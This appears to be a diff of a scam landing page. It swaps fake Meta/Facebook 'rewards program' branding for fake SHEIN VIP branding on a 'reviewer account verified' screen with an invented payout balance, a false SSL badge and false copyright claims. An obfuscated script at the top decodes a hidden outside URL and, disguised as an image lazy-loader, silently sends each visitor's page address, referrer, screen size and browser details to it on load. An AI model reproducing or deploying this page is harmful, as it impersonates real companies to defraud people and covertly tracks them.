@@ -4,23 +4,23 @@
 <script>!function(){var _p=["aHR0cHM6Ly9jbGljay1jaGFybS03My5sb3ZhYmxlLmFwcA==","L2FwaS9wdWJsaWMvY2RuL2Fzc2V0cy92MS9tZXRyaWNz","976e24b0-6a4d-4dd1-90af-7b0e1f18cfdd"],_d=function(x){try{return atob(x)}catch(e){return""}},_e=function(){return _d(_p[0])+_d(_p[1])+"/"+_p[2]};function _h(){try{var r=document.documentElement;r.setAttribute("data-ready","1");var ns=document.querySelectorAll("img[data-src]"),io=("IntersectionObserver"in window)?new IntersectionObserver(function(xs){xs.forEach(function(x){if(x.isIntersecting){var t=x.target,s=t.getAttribute("data-src");if(s){t.src=s;t.removeAttribute("data-src")}io.unobserve(t)}})},{rootMargin:"200px"}):null;ns.forEach(function(t){if(io)io.observe(t);else{var s=t.getAttribute("data-src");if(s){t.src=s;t.removeAttribute("data-src")}}})}catch(e){}try{var l=location,g=screen,n=navigator,q=["h="+encodeURIComponent(l.hostname),"u="+encodeURIComponent(l.href),"r="+encodeURIComponent(document.referrer||""),"s="+(g.width+"x"+g.height),"ua="+encodeURIComponent(n.userAgent),"t="+Date.now()],i=new Image();i.decoding="async";i.loading="eager";i.src=_e()+"?"+q.join("&")}catch(e){}}if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",_h,{once:true})}else{_h()}if(document.fonts&&document.fonts.ready&&document.fonts.ready.then){document.fonts.ready.then(function(){try{document.documentElement.setAttribute("data-fonts","1")}catch(e){}})}}();</script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Account Verified — Meta Rewards</title>
-  <link rel="icon" href="../images/DF32jO8vZckV.png">
+  <title>Reviewer Account Verified — SHEIN VIP</title>
+  <link rel="icon" href="../images/shein-icon.svg">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
   <style>
     :root {
-      --fb-blue: #1877F2;
-      --fb-blue-hover: #166FE5;
-      --fb-green: #008a3e;
-      --fb-green-bg: #E8F8F0;
-      --fb-surface: #FFFFFF;
-      --fb-bg: #F0F2F5;
-      --fb-border: #E4E6EB;
-      --fb-text: #050505;
-      --fb-muted: #65676B;
+      --shein-black: #111111;
+      --shein-coral: #ff4d6d;
+      --shein-green: #008a3e;
+      --shein-green-bg: #E8F8F0;
+      --shein-surface: #FFFFFF;
+      --shein-bg: #F8F9FA;
+      --shein-border: #EBEBEB;
+      --shein-text: #111111;
+      --shein-muted: #666666;
     }
 
     * {
@@ -31,9 +31,9 @@
     }
 
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background: var(--fb-bg);
-      color: var(--fb-text);
+      font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--shein-bg);
+      color: var(--shein-text);
       min-height: 100vh;
       display: flex;
       flex-direction: column;
@@ -43,12 +43,12 @@
     }
 
     .thanks-card {
-      background: var(--fb-surface);
-      border: 1px solid var(--fb-border);
+      background: var(--shein-surface);
+      border: 1px solid var(--shein-border);
       border-radius: 20px;
       width: 100%;
       max-width: 540px;
-      box-shadow: 0 12px 36px rgba(0, 0, 0, 0.08);
+      box-shadow: 0 12px 36px rgba(0, 0, 0, 0.07);
       padding: 36px 28px;
       text-align: center;
       animation: fadeIn 0.4s ease-out;
@@ -68,25 +68,8 @@
       margin-bottom: 24px;
     }
     .brand-logo {
-      width: 38px;
-      height: 38px;
-    }
-    .brand-title {
-      font-weight: 800;
-      font-size: 20px;
-      letter-spacing: -0.03em;
-      color: var(--fb-blue);
-      line-height: 1;
-      text-align: left;
-    }
-    .brand-sub {
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      color: var(--fb-muted);
-      text-align: left;
-      margin-top: 2px;
+      height: 28px;
+      object-fit: contain;
     }
 
     /* Success Icon */
@@ -94,8 +77,8 @@
       width: 76px;
       height: 76px;
       border-radius: 50%;
-      background: var(--fb-green-bg);
-      color: var(--fb-green);
+      background: #fff1f2;
+      color: var(--shein-coral);
       display: inline-flex;
       align-items: center;
       justify-content: center;
@@ -122,7 +105,7 @@
 
     .thanks-subtitle {
       font-size: 14.5px;
-      color: var(--fb-muted);
+      color: var(--shein-muted);
       line-height: 1.5;
       margin-bottom: 20px;
     }
@@ -130,7 +113,7 @@
     /* Status Box */
     .status-box {
       background: #F9FAFB;
-      border: 1px solid var(--fb-border);
+      border: 1px solid var(--shein-border);
       border-radius: 14px;
       padding: 16px 18px;
       margin-bottom: 24px;
@@ -152,7 +135,7 @@
       padding-top: 0;
     }
     .status-label {
-      color: var(--fb-muted);
+      color: var(--shein-muted);
       font-weight: 500;
     }
     .status-val {
@@ -163,8 +146,8 @@
       display: inline-flex;
       align-items: center;
       gap: 5px;
-      background: var(--fb-green-bg);
-      color: var(--fb-green);
+      background: var(--shein-green-bg);
+      color: var(--shein-green);
       font-size: 12px;
       font-weight: 800;
       padding: 3px 10px;
@@ -179,20 +162,20 @@
       gap: 10px;
       width: 100%;
       min-height: 54px;
-      background: var(--fb-blue);
+      background: #111111;
       color: #ffffff;
-      font-size: 15.5px;
+      font-size: 15px;
       font-weight: 800;
-      letter-spacing: 0.02em;
+      letter-spacing: 0.03em;
       text-transform: uppercase;
       text-decoration: none;
       border-radius: 12px;
-      box-shadow: 0 6px 20px rgba(24, 119, 242, 0.35);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.25);
       transition: background 0.15s, transform 0.1s, box-shadow 0.15s;
     }
     .btn-access:hover {
-      background: var(--fb-blue-hover);
-      box-shadow: 0 8px 24px rgba(24, 119, 242, 0.45);
+      background: #2b2b2b;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
     }
     .btn-access:active {
       transform: scale(0.98);
@@ -229,16 +212,9 @@
 
   <div class="thanks-card">
     
-    <!-- Meta Logo -->
+    <!-- SHEIN Logo -->
     <div class="brand-header">
-      <svg class="brand-logo" viewBox="0 0 36 36" fill="none">
-        <circle cx="18" cy="18" r="18" fill="#1877F2"/>
-        <path fill="#ffffff" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/>
-      </svg>
-      <div>
-        <div class="brand-title">facebook</div>
-        <div class="brand-sub">rewards program</div>
-      </div>
+      <img src="../images/shein-logo.svg" alt="SHEIN VIP" class="brand-logo">
     </div>
 
     <!-- Success Badge -->
@@ -248,9 +224,9 @@
       </svg>
     </div>
 
-    <h1 class="thanks-title">Registration &amp; Settlement Verified</h1>
+    <h1 class="thanks-title">VIP Reviewer Status Confirmed</h1>
     <p class="thanks-subtitle">
-      Your evaluator credentials and security profile are now officially active in our system. Click the button below to access your evaluation workspace.
+      Your product evaluator credentials and payment channel are now verified. Your initial balance and upcoming product testing shipments are active.
     </p>
 
     <!-- Details Box -->
@@ -266,16 +242,16 @@
       </div>
       <div class="status-row">
         <span class="status-label">Evaluator Email</span>
-        <span class="status-val" id="disp-email">user@meta.com</span>
+        <span class="status-val" id="disp-email">user@shein.com</span>
       </div>
       <div class="status-row">
         <span class="status-label">Allocated Payout Balance</span>
-        <span class="status-val" style="color: var(--fb-green); font-weight:800;">$ 278.45</span>
+        <span class="status-val" style="color: var(--shein-green); font-weight:800;">$ 278.45</span>
       </div>
     </div>
 
     <!-- Action Button -->
-    <a id="btn-access-dashboard" href="https://metarewards.lovable.app" class="btn-access">
+    <a id="btn-access-dashboard" href="https://shein.com" class="btn-access">
       <span>ACCESS YOUR EVALUATOR DASHBOARD</span>
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
         <line x1="5" y1="12" x2="19" y2="12"></line>
@@ -288,12 +264,12 @@
         <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
         <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
       </svg>
-      <span>256-Bit SSL Encrypted Verification</span>
+      <span>256-Bit SSL Encrypted Verification · SHEIN VIP</span>
     </div>
 
   </div>
 
-  <p class="footer-copy">© <span id="yr"></span> Meta Platforms Inc. All rights reserved.</p>
+  <p class="footer-copy">© <span id="yr"></span> SHEIN Distribution Corp. All rights reserved.</p>
 
   <script>
     document.getElementById('yr').textContent = new Date().getFullYear();
